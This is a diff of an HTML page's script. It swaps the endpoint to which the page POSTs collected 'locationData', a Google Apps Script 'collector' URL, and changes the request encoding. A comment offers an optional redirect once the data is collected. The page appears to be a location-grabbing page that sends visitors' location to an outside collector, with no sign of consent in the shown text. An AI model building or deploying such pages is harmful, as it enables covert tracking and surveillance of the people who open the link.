@@ -79,17 +79,20 @@
           };
 
           // Send to your collector (replace with your Google Apps Script URL)
-          await fetch(
-            "https://script.google.com/macros/s/AKfycbxl1NWbKrbGUElhUsCPLkS7S081plOfH1U8XQ0DoicGpH_GRxi2jUkL2_jXNXdZYFjZ/exec",
-            {
-              method: "POST",
-              mode: "no-cors",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(locationData),
-            }
-          );
+          // Send to your collector
+await fetch(
+  "https://script.google.com/macros/s/AKfycbwm2_kxYQ_6ZtChUhb91jlnEpIBmPsRwL3RBKjmwKpqPSqvr9MW2io7dqczTy3fh2mn/exec",
+  {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: new URLSearchParams({
+      data: JSON.stringify(locationData)
+    })
+  }
+);
+
 
           // Optional: redirect to another page after data is collected
           // window.location.href = 'https://example.com';
@@ -107,4 +110,5 @@
     </script>
   </body>
 </html>
+
 
